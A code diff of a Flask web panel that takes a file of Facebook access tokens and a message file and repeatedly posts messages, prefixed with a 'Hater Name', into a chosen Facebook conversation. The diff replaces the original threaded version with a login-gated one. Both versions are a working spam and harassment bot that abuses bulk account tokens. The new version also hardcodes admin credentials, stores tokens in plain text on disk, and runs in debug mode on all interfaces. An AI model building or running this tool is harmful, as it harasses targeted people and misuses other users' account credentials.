@@ -1,204 +1,356 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, redirect, url_for, session, flash
 import requests
-from threading import Thread, Event
 import time
-import random
-import string
+import os
  
 app = Flask(__name__)
-app.debug = True
+app.secret_key = 'your_secret_key_here'  # Change this to a random secret key
+ 
+# Login credentials
+ADMIN_USERNAME = "ERIIC-EXO"
+ADMIN_PASSWORD = "3RIIC-XD"
  
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
     'referer': 'www.google.com'
 }
  
-stop_events = {}
-threads = {}
- 
-def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
-    stop_event = stop_events[task_id]
-    while not stop_event.is_set():
-        for message1 in messages:
-            if stop_event.is_set():
-                break
-            for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message1
-                parameters = {'access_token': access_token, 'message': message}
-                response = requests.post(api_url, data=parameters, headers=headers)
-                if response.status_code == 200:
-                    print(f"Message Sent Successfully From token {access_token}: {message}")
-                else:
-                    print(f"Message Sent Failed From token {access_token}: {message}")
-                time.sleep(time_interval)
- 
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        token_option = request.form.get('tokenOption')
-        
-        if token_option == 'single':
-            access_tokens = [request.form.get('singleToken')]
-        else:
-            token_file = request.files['tokenFile']
-            access_tokens = token_file.read().decode().strip().splitlines()
- 
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
- 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
- 
-        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
- 
-        stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
-        threads[task_id] = thread
-        thread.start()
- 
-        return f'Task started with ID: {task_id}'
- 
-    return render_template_string('''
+# HTML Templates
+LOGIN_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>👀𝘞𝘢𝘳 Anish xd🌀</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-  <style>
-    /* CSS for styling elements */
-    label { color: white; }
-    .file { height: 30px; }
-    body {
-      background-image: url('https://i.ibb.co/LRrPTkG/c278d531d734cc6fcf79165d664fdee3.jpg');
-      background-size: cover;
-      background-repeat: no-repeat;
-      color: white;
-    }
-    .container {
-      max-width: 350px;
-      height: auto;
-      border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-      box-shadow: 0 0 15px white;
-      border: none;
-      resize: none;
-    }
-    .form-control {
-      outline: 1px red;
-      border: 1px double white;
-      background: transparent;
-      width: 100%;
-      height: 40px;
-      padding: 7px;
-      margin-bottom: 20px;
-      border-radius: 10px;
-      color: white;
-    }
-    .header { text-align: center; padding-bottom: 20px; }
-    .btn-submit { width: 100%; margin-top: 10px; }
-    .footer { text-align: center; margin-top: 20px; color: #888; }
-    .whatsapp-link {
-      display: inline-block;
-      color: #25d366;
-      text-decoration: none;
-      margin-top: 10px;
-    }
-    .whatsapp-link i { margin-right: 5px; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ERIIC-XD- Login</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-image: url('https://i.ibb.co/GFrX0WL/5381fbf1ab1cac1bf385c792f121267c.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            padding: 2rem;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+            text-align: center;
+            width: 300px;
+        }
+        h1 {
+            color: #fff;
+            margin-bottom: 1.5rem;
+            font-weight: 600;
+        }
+        input {
+            width: 100%;
+            padding: 0.75rem;
+            margin-bottom: 1rem;
+            border: none;
+            border-radius: 50px;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+        input:focus {
+            outline: none;
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 0.75rem 1.5rem;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #45a049;
+            transform: translateY(-2px);
+        }
+        .flash-message {
+            margin-bottom: 1rem;
+            padding: 0.5rem;
+            border-radius: 4px;
+            font-size: 0.9rem;
+        }
+        .flash-message.error {
+            background-color: rgba(244, 67, 54, 0.1);
+            border: 1px solid #f44336;
+            color: #f44336;
+        }
+        .contact-admin {
+            margin-top: 1rem;
+            font-size: 0.9rem;
+        }
+        .contact-admin a {
+            color: #4CAF50;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+        .contact-admin a:hover {
+            color: #45a049;
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-  <header class="header mt-4">
-    <h1 class="mt-3">♛♥彡𝐖𝐚𝐫 ANISH XD ♛♥☨</h1>
-  </header>
-  <div class="container text-center">
-    <form method="post" enctype="multipart/form-data">
-      <div class="mb-3">
-        <label for="tokenOption" class="form-label">Select Token Option</label>
-        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
-          <option value="single">Single Token</option>
-          <option value="multiple">Token File</option>
-        </select>
-      </div>
-      <div class="mb-3" id="singleTokenInput">
-        <label for="singleToken" class="form-label">Enter Single Token</label>
-        <input type="text" class="form-control" id="singleToken" name="singleToken">
-      </div>
-      <div class="mb-3" id="tokenFileInput" style="display: none;">
-        <label for="tokenFile" class="form-label">Choose Token File</label>
-        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
-      </div>
-      <div class="mb-3">
-        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
-      </div>
-      <div class="mb-3">
-        <label for="kidx" class="form-label">Enter Your Hater Name</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
-      </div>
-      <div class="mb-3">
-        <label for="time" class="form-label">Enter Time (seconds)</label>
-        <input type="number" class="form-control" id="time" name="time" required>
-      </div>
-      <div class="mb-3">
-        <label for="txtFile" class="form-label">Choose Your Np File</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
-      </div>
-      <button type="submit" class="btn btn-primary btn-submit">Run</button>
-      </form>
-    <form method="post" action="/stop">
-      <div class="mb-3">
-        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
-        <input type="text" class="form-control" id="taskId" name="taskId" required>
-      </div>
-      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
-    </form>
-  </div>
-  <footer class="footer">
-    <p>© 2023 ANISH THE LEGENG BOII😈🐧</p>
-    <p> ANISH XD<a href="https://www.facebook.com/BL9CK.D3V1L">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
-    <div class="mb-3">
-      <a href="https://wa.me/+917668337116" class="whatsapp-link">
-        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
-      </a>
+    <div class="login-container">
+        <h1>ERIIC-XD</h1>
+        {% with messages = get_flashed_messages(with_categories=true) %}
+            {% if messages %}
+                {% for category, message in messages %}
+                    <div class="flash-message {{ category }}">{{ message }}</div>
+                {% endfor %}
+            {% endif %}
+        {% endwith %}
+        <form action="{{ url_for('login') }}" method="post">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+        <div class="contact-admin">
+            <a href="mailto:krishera61@gmail.com">Contact Admin</a>
+        </div>
     </div>
-  </footer>
-  <script>
-    function toggleTokenInput() {
-      var tokenOption = document.getElementById('tokenOption').value;
-      if (tokenOption == 'single') {
-        document.getElementById('singleTokenInput').style.display = 'block';
-        document.getElementById('tokenFileInput').style.display = 'none';
-      } else {
-        document.getElementById('singleTokenInput').style.display = 'none';
-        document.getElementById('tokenFileInput').style.display = 'block';
-      }
-    }
-  </script>
 </body>
 </html>
-''')
+'''
  
-@app.route('/stop', methods=['POST'])
-def stop_task():
-    task_id = request.form.get('taskId')
-    if task_id in stop_events:
-        stop_events[task_id].set()
-        return f'Task with ID {task_id} has been stopped.'
+ADMIN_TEMPLATE = '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ERIIC-XD - Admin Panel</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('https://i.ibb.co/MkCcvwH/df6416b6af5058e36c5d11f457e3282a.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            margin: 0;
+            padding: 20px;
+            color: white;
+        }
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+        }
+        h1, h2 {
+            text-align: center;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        label {
+            margin-top: 10px;
+        }
+        input, select {
+            margin-bottom: 10px;
+            padding: 5px;
+            border-radius: 5px;
+            border: none;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .logout {
+            text-align: right;
+        }
+        .logout a {
+            color: #f44336;
+            text-decoration: none;
+        }
+        .flash-message {
+            margin-bottom: 1rem;
+            padding: 0.5rem;
+            border-radius: 4px;
+        }
+        .flash-message.success {
+            background-color: #dff0d8;
+            border: 1px solid #3c763d;
+            color: #3c763d;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logout">
+            <a href="{{ url_for('logout') }}">Logout</a>
+        </div>
+        <h1>ERIIC-XD</h1>
+        <h2>ERIIC MULTI CONVO</h2>
+        {% with messages = get_flashed_messages(with_categories=true) %}
+            {% if messages %}
+                {% for category, message in messages %}
+                    <div class="flash-message {{ category }}">{{ message }}</div>
+                {% endfor %}
+            {% endif %}
+        {% endwith %}
+        <form action="{{ url_for('send_message') }}" method="post" enctype="multipart/form-data">
+            <label for="threadId">Convo_id:</label>
+            <input type="text" id="threadId" name="threadId" required>
+            
+            <label for="txtFile">Select Your Tokens File:</label>
+            <input type="file" id="txtFile" name="txtFile" accept=".txt" required>
+            
+            <label for="messagesFile">Select Your Np File:</label>
+            <input type="file" id="messagesFile" name="messagesFile" accept=".txt" required>
+            
+            <label for="kidx">Enter Hater Name:</label>
+            <input type="text" id="kidx" name="kidx" required>
+            
+            <label for="time">Speed in Seconds:</label>
+            <input type="number" id="time" name="time" value="60" required>
+            
+            <button type="submit">Submit Your Details</button>
+        </form>
+    </div>
+</body>
+</html>
+'''
+ 
+@app.route('/')
+def index():
+    if 'username' in session:
+        return redirect(url_for('admin_panel'))
+    return render_template_string(LOGIN_TEMPLATE)
+ 
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+    
+    if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
+        session['username'] = username
+        return redirect(url_for('admin_panel'))
     else:
-        return f'No task found with ID {task_id}.'
+        flash('Incorrect username or password. Please try again.', 'error')
+        return redirect(url_for('index'))
+ 
+@app.route('/logout')
+def logout():
+    session.pop('username', None)
+    return redirect(url_for('index'))
+ 
+@app.route('/admin')
+def admin_panel():
+    if 'username' not in session:
+        return redirect(url_for('index'))
+    return render_template_string(ADMIN_TEMPLATE)
+ 
+@app.route('/send_message', methods=['POST'])
+def send_message():
+    if 'username' not in session:
+        return redirect(url_for('index'))
+    
+    thread_id = request.form.get('threadId')
+    mn = request.form.get('kidx')
+    time_interval = int(request.form.get('time'))
+ 
+    txt_file = request.files['txtFile']
+    access_tokens = txt_file.read().decode().splitlines()
+ 
+    messages_file = request.files['messagesFile']
+    messages = messages_file.read().decode().splitlines()
+ 
+    num_comments = len(messages)
+    max_tokens = len(access_tokens)
+ 
+    # Create a folder with the Convo ID
+    folder_name = f"Convo_{thread_id}"
+    os.makedirs(folder_name, exist_ok=True)
+ 
+    # Create files inside the folder
+    with open(os.path.join(folder_name, "CONVO.txt"), "w") as f:
+        f.write(thread_id)
+ 
+    with open(os.path.join(folder_name, "token.txt"), "w") as f:
+        f.write("\n".join(access_tokens))
+ 
+    with open(os.path.join(folder_name, "haters.txt"), "w") as f:
+        f.write(mn)
+ 
+    with open(os.path.join(folder_name, "time.txt"), "w") as f:
+        f.write(str(time_interval))
+ 
+    with open(os.path.join(folder_name, "message.txt"), "w") as f:
+        f.write("\n".join(messages))
+ 
+    with open(os.path.join(folder_name, "np.txt"), "w") as f:
+        f.write("NP")  # Assuming NP is a fixed value
+ 
+    post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+    haters_name = mn
+    speed = time_interval
+ 
+    # Start the message sending process
+    try:
+        for message_index in range(num_comments):
+            token_index = message_index % max_tokens
+            access_token = access_tokens[token_index]
+ 
+            message = messages[message_index].strip()
+ 
+            parameters = {'access_token': access_token,
+                          'message': haters_name + ' ' + message}
+            response = requests.post(post_url, json=parameters, headers=headers)
+ 
+            current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+            if response.ok:
+                print(f"[+] SEND SUCCESSFUL No. {message_index + 1} Post Id {post_url} time {current_time}: Token No.{token_index + 1}")
+                print(f"  - Message: {haters_name + ' ' + message}")
+                print("\n" * 2)
+            else:
+                print(f"[x] Failed to send Comment No. {message_index + 1} Post Id {post_url} Token No. {token_index + 1}")
+                print(f"  - Message: {haters_name + ' ' + message}")
+                print(f"  - Time: {current_time}")
+                print("\n" * 2)
+            time.sleep(speed)
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        time.sleep(30)
+ 
+    flash('Message sending process completed.', 'success')
+    return redirect(url_for('admin_panel'))
  
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5000, debug=True)
